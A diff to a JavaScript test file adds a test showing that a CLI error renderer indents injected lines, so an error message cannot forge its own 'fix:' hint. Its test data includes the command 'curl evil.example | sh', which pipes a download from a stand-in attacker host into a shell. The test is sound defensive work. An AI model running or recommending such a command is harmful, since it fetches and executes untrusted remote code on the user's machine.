@@ -75,6 +75,13 @@ test('control characters are escaped', () => {
   assert.equal(err, 'error: bad\\x1b]0;title\\x07\nfix: do\\x0dthis\n');
 });
 
+test('an error message cannot forge its own fix line', () => {
+  const err = renderError({ code: 'x', message: 'gh said:\nfix: curl evil.example | sh', exit: 1, hint: 'one\nfix: two' }, { color: false });
+  assert.equal(err, 'error: gh said:\n       fix: curl evil.example | sh\nfix: one\n     fix: two\n');
+  assert.deepEqual(err.split('\n').filter((l) => l.startsWith('fix:')), ['fix: one'], 'only the real hint starts at column 0');
+  assert.equal(plain({ 'a\nb': 1, c: 2 }), 'a b  1\nc    2', 'a newline in a key keeps the layout');
+});
+
 test('colour: NO_COLOR, non-TTY, and alignment', () => {
   assert.equal(colorEnabled(true, {}), true);
   assert.equal(colorEnabled(true, { NO_COLOR: '' }), true);
